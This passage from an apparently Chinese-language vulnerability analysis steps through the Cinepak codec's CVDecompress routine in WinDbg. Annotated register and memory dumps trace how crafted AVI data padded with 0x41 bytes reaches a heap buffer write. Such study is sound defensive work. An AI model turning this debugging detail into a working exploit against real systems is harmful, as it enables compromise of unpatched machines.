class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x51</span>:</span><br><span class="line">73b721ff <span class="number">394510</span>          <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">10h</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd40=<span class="number">00000068</span> <span class="comment">; a3为从“idx1”索引块中读出的数据块的数据长度,eax为从对应的数据块中读出的数据长度,这里判断它们是否相同</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000068</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000068</span> <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72202 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x54</span>:</span><br><span class="line">73b72202 0f8cec010000    <span class="keyword">jl</span>      iccvid!CVDecompress+<span class="number">0x246</span> (73b723f4)    [br=<span class="number">0</span>] <span class="comment">; 小于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000068</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000068</span> <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72208 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x5a</span>:</span><br><span class="line">73b72208 8a0e            <span class="keyword">mov</span>     <span class="built_in">cl</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]          <span class="built_in">ds</span>:<span class="number">0023</span>:00ba68f8=<span class="number">00</span> <span class="comment">; cl = 0x00,Flags(Frame Header)</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000068</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7220a <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x5c</span>:</span><br><span class="line">73b7220a 884d13          <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">13h</span>],<span class="built_in">cl</span>      <span class="built_in">ss</span>:<span class="number">0023</span>:025afd43=<span class="number">00</span> <span class="comment">; a3的最高字节,a3为“idx1”索引块中读出的数据块的数据长度，Length of CVID data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000068</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7220d <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x5f</span>:</span><br><span class="line">73b7220d 8d4df0          <span class="keyword">lea</span>     <span class="built_in">ecx</span>,[<span class="built_in">ebp</span>-<span class="number">10h</span>]</span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000068</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=025afd20 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72210 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x62</span>:</span><br><span class="line">73b72210 <span class="number">51</span>              <span class="keyword">push</span>    <span class="built_in">ecx</span>                                            <span class="comment">; arg3 = ecx = 0x025afd20,用于保存减去Frame Header的大小后,剩余的数据大小</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000068</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=025afd20 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72211 <span class="built_in">esp</span>=025afd00 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x63</span>:</span><br><span class="line">73b72211 6a0a            <span class="keyword">push</span>    <span class="number">0Ah</span>                                            <span class="comment">; arg2 = 0xA,Frame Header的大小</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000068</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=025afd20 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72213 <span class="built_in">esp</span>=025afcfc <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x65</span>:</span><br><span class="line">73b72213 <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span>                                            <span class="comment">; arg1 = 0x00000068,CVID数据长度</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000068</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=025afd20 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72214 <span class="built_in">esp</span>=025afcf8 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x66</span>:</span><br><span class="line">73b72214 e86dffffff      <span class="keyword">call</span>    iccvid!ULongSub (73b72186)                     <span class="comment">; 如果arg1&gt;=arg2,则返回0,且计算出减去Frame Header的大小后,剩余的数据大小,否则返回一个负数</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72219 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x6b</span>:</span><br><span class="line">73b72219 85c0            <span class="keyword">test</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span>                                        <span class="comment">; eax = 0x0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7221b <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x6d</span>:</span><br><span class="line">73b7221b 0f8cd3010000    <span class="keyword">jl</span>      iccvid!CVDecompress+<span class="number">0x246</span> (73b723f4)    [br=<span class="number">0</span>] <span class="comment">; 小于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72221 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x73</span>:</span><br><span class="line">73b72221 33c0            <span class="keyword">xor</span>     <span class="built_in">eax</span>,<span class="built_in">eax</span>                                        <span class="comment">; eax = eax^eax = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72223 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x75</span>:</span><br><span class="line">73b72223 8a6608          <span class="keyword">mov</span>     <span class="number">ah</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">8</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6900=<span class="number">00</span> <span class="comment">; ah = 0x00,Number of coded strips的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72226 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x78</span>:</span><br><span class="line">73b72226 83c60a          <span class="keyword">add</span>     <span class="built_in">esi</span>,<span class="number">0Ah</span>                                        <span class="comment">; esi = 0x00ba6902,指向cinepak_codec_data2</span></span><br><span class="line"><span class="number">0</span>:<span class="number">011</span>&gt; <span class="built_in">dd</span> 00ba6902 </span><br><span class="line">00ba6902  <span class="number">10000010</span> <span class="number">00000000</span> <span class="number">60016000</span> <span class="number">00000020</span></span><br><span class="line">00ba6912  <span class="number">10000011</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></span><br><span class="line">00ba6922  <span class="number">10000011</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></span><br><span class="line">00ba6932  <span class="number">10000011</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></span><br><span class="line">00ba6942  <span class="number">10000011</span> <span class="number">64690041</span> <span class="number">00103178</span> <span class="number">30300000</span></span><br><span class="line">00ba6952  <span class="number">00106364</span> <span class="number">00040000</span> <span class="number">00680000</span> <span class="number">00000000</span></span><br><span class="line">00ba6962  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">00ba6972  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72229 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz ac po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000212</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x7b</span>:</span><br><span class="line">73b72229 897<span class="keyword">dec</span>          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">14h</span>],<span class="built_in">edi</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd1c=0236f648  <span class="comment">; edi = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7222c <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz ac po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000212</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x7e</span>:</span><br><span class="line">73b7222c 8975e8          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">18h</span>],<span class="built_in">esi</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd18=<span class="number">00000120</span>  <span class="comment">; [ebp-18h] = esi = 0x00ba6902,指向cinepak_codec_data2</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7222f <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz ac po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000212</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x81</span>:</span><br><span class="line">73b7222f 8975f4          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">0Ch</span>],<span class="built_in">esi</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd24=<span class="number">00000004</span> <span class="comment">; [ebp-0Ch] = esi = 0x00ba6902,指向cinepak_codec_data2</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72232 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz ac po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000212</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x84</span>:</span><br><span class="line">73b72232 8a46ff          <span class="keyword">mov</span>     <span class="built_in">al</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>-<span class="number">1</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6901=<span class="number">10</span>     <span class="comment">; al = 0x10,Number of coded strips的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; <span class="built_in">dd</span> 00ba6902 </span><br><span class="line">00ba6902  <span class="number">10000010</span> <span class="number">00000000</span> <span class="number">60016000</span> <span class="number">00000020</span></span><br><span class="line">00ba6912  <span class="number">10000011</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></span><br><span class="line">00ba6922  <span class="number">10000011</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></span><br><span class="line">00ba6932  <span class="number">10000011</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></span><br><span class="line">00ba6942  <span class="number">10000011</span> <span class="number">64690041</span> <span class="number">00103178</span> <span class="number">30300000</span></span><br><span class="line">00ba6952  <span class="number">00106364</span> <span class="number">00040000</span> <span class="number">00680000</span> <span class="number">00000000</span></span><br><span class="line">00ba6962  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">00ba6972  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72235 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz ac po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000212</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x87</span>:</span><br><span class="line">73b72235 3bc7            <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="built_in">edi</span>                                        <span class="comment">; 判断Number of coded strips是否大于0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72237 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x89</span>:</span><br><span class="line">73b72237 8945e4          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">1Ch</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd14=<span class="number">00000001</span> <span class="comment">; [ebp-1Ch] = eax = 0x10,Number of coded strips</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7223a <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x8c</span>:</span><br><span class="line">73b7223a 0f8eaa010000    <span class="keyword">jle</span>     iccvid!CVDecompress+<span class="number">0x23c</span> (73b723ea)    [br=<span class="number">0</span>] <span class="comment">; 小于等于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72240 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x92</span>:</span><br><span class="line">73b72240 897dfc          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>],<span class="built_in">edi</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd2c=<span class="number">00000150</span> <span class="comment">; 局部变量[ebp-4]赋值为0,堆缓冲区指针偏移</span></span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72243 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span 